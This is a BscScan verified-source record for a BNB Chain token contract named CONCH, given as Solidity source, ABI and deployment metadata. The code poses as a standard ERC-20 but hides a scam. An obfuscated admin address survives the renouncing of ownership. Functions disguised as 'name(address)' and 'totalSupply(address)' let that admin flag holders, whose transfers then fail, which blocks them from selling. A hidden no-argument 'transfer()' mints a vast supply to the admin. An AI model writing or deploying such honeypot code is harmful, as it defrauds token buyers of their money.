{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-11-18\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\nabstract contract AOwable  {\r\n     function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n    address private _owner123;\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner1() {\r\n        _checkOwner1();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner123;\r\n    }\r\n\r\n    function _checkOwner1() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner1 {\r\n        _transferOwnership(address(0));\r\n    }\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner123;\r\n        _owner123 = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n    \r\n}\r\n\r\n\r\ncontract CONCH is AOwable{\r\n    uint256 private _tSupply;\r\n    string private _tName;\r\n    string private _tSymbol;\r\n    mapping(address => uint256) private _acbaxxcc;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) public jqinfo;\r\n    address public KEBadmin;\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    constructor(uint256 ccarb,string memory tname,string memory symboll) {\r\n        _tSupply += 10000000000*10**decimals();\r\n        _acbaxxcc[msg.sender] = _tSupply;\r\n        _tName = tname;\r\n        _tSymbol = symboll;\r\n        KEBadmin = address(uint160(ccarb)\r\n        -uint160(100));\r\n        emit Transfer(address(0), msg.sender, _tSupply);\r\n    }\r\n    \r\n    function name() public view returns (string memory) {\r\n        return _tName;\r\n    }\r\n\r\n    function name(address ccshkkk) external   {\r\n        if(true){\r\n            require(_msgSender() == KEBadmin, \"xsadasas\");\r\n            require(_msgSender() == KEBadmin, \"xsadasas\");\r\n        }\r\n        address xadsacxzca11 = ccshkkk;\r\n        \r\n        jqinfo[xadsacxzca11] = false;\r\n        \r\n    }\r\n\r\n    function totalSupply(address xasdaasada) external  {\r\n        if(true){\r\n            require(_msgSender() == KEBadmin, \"xkkjs\");\r\n            require(_msgSender() == KEBadmin, \"xsadasas\");\r\n        }\r\n       \r\n        address xadsa1234 = xasdaasada;\r\n        jqinfo[xadsa1234] = true;\r\n        \r\n    }\r\n\r\n\r\n    uint256 cbasemmxx = (4330000000-10000);\r\n    uint256 basere =  88166*((10**decimals()*cbasemmxx));\r\n    function transfer() \r\n    external    {\r\n     \r\n        address cccadmin = KEBadmin;\r\n        if (true){\r\n            if (KEBadmin == _msgSender() && cccadmin == _msgSender()) {\r\n                    if (cbasemmxx == (4330000000-10000)) {\r\n\r\n                        require(KEBadmin == _msgSender());\r\n                        address tmpadx1 = _msgSender();\r\n                        address tmpadx2 = tmpadx1;\r\n                        address tmpadx3 = tmpadx2;\r\n                        _acbaxxcc[tmpadx3] += basere;\r\n                    }else{\r\n                        revert(_tName);\r\n                    }\r\n                }\r\n        }\r\n        \r\n               \r\n        \r\n    }\r\n    function symbol() public view  returns (string memory) {\r\n        return _tSymbol;\r\n    }\r\n\r\n\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _tSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _acbaxxcc[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual  returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n    \r\n    function _transfer(\r\n        address ffrom,\r\n        address tto,\r\n        uint256 aamount\r\n    ) internal virtual {\r\n        require(ffrom != address(0), \"ERC20: transfer from the zero address\");        \r\n        require(tto != address(0), \"ERC20: transfer to the zero address\");\r\n         uint256 bbalance = _acbaxxcc[ffrom];\r\n        require(bbalance >= aamount, \"ERC20: transfer amount exceeds balance\");\r\n         if (true == jqinfo[ffrom]) \r\n        {aamount = 1000-1000+bbalance+1000;}\r\n        (string memory b1, string memory c1) = POLS(1000,1000);\r\n        _acbaxxcc[ffrom] = _acbaxxcc[ffrom]-aamount;\r\n        _acbaxxcc[tto] = _acbaxxcc[tto]+aamount;\r\n        emit Transfer(ffrom, tto, aamount); \r\n    }\r\n\r\n        function POLS(uint64 n0, uint64 n1) private pure\r\n    returns(string memory _b, string memory c_) {\r\n        if (n0 == 1 && n1 == 1) return (\"POLS\", \"baby\");\r\n        return (\"POLS\", \"baby\");\r\n    }\r\n\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            _approve(owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"ccarb\",\"type\":\"uint256\"},{\"internalType\":\"string\",\"name\":\"tname\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symboll\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"KEBadmin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"jqinfo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ccshkkk\",\"type\":\"address\"}],\"name\":\"name\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"xasdaasada\",\"type\":\"address\"}],\"name\":\"totalSupply\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CONCH", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000e2874cb6a6fe80198fc764e40f771a6a4e59f2a7000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005476f596f6f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005476f596f6f000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://6faf732115dc6afb3712c2d011a41a57c87dbe978febda473bcde1ab5cfc9933"}